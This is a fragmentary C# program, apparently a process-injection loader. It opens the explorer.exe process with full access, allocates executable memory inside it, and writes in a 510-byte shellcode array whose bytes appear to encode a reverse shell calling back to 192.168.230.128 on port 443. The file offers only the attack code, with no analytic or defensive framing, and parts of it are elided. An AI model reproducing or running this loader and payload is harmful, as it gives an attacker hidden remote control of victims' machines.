...
namespace Injection
{
    class Program
    {
        ...
        {
            Process process = Process.GetProcessesByName("explorer")[0]; // Replace "processName" with the desired process name
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, process.Id);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            byte[] buf = new byte[510] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
...
0x49,0xbc,0x02,0x00,0x01,0xbb,0xc0,0xa8,0xe6,0x80,0x41,0x54,0x49,0x89,0xe4,
...
0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5}; // your byte array

            WriteProcessMemory(hProcess, addr, buf, buf.Length, out IntPtr bytesWritten);
